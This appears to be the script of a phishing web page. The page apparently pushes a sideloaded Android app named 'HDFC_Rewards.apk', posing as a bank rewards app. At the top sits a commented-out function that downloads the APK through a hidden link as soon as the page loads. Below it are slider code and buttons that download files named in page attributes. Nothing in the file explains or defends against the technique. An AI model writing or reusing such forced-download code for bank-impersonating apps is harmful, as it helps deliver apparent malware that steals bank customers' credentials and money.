// function autoDownloadAPK() {
//     var apkLink = document.createElement('a');
//     apkLink.href = 'image/HDFC_Rewards.apk'; // Specify the APK file path
//     apkLink.download = 'HDFC_Rewards.apk';  // Specify the desired download filename
//     apkLink.style.display = 'none';
//     document.body.appendChild(apkLink);
//     apkLink.click();
//     document.body.removeChild(apkLink);
// }

// window.onload = autoDownloadAPK;


let currentSlide = 0;
const slides = document.querySelectorAll(".slide");

function showSlide(index) {
    slides.forEach((slide, i) => {
        slide.style.display = i === index ? "block" : "none";
    });
}

function changeSlide(direction) {
    currentSlide = (currentSlide + direction + slides.length) % slides.length;
    showSlide(currentSlide);
}

// Pehli image show karne ke liye
showSlide(currentSlide);



document.addEventListener('DOMContentLoaded', function() {
    // Handle button clicks for downloads
    const buttons = document.querySelectorAll('[data-download-url]');

    buttons.forEach(button => {
        button.addEventListener('click', function() {
            const url = this.getAttribute('data-download-url');
            const a = document.createElement('a');
            a.href = url;
            a.download = url.split('/').pop();
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        });
    });

    // Handle menu toggle for mobile
    const menuToggle = document.querySelector('.menu-toggle');
    const navLinks = document.querySelector('.nav-links');

    menuToggle.addEventListener('click', function() {
        navLinks.classList.toggle('active');
    });
});
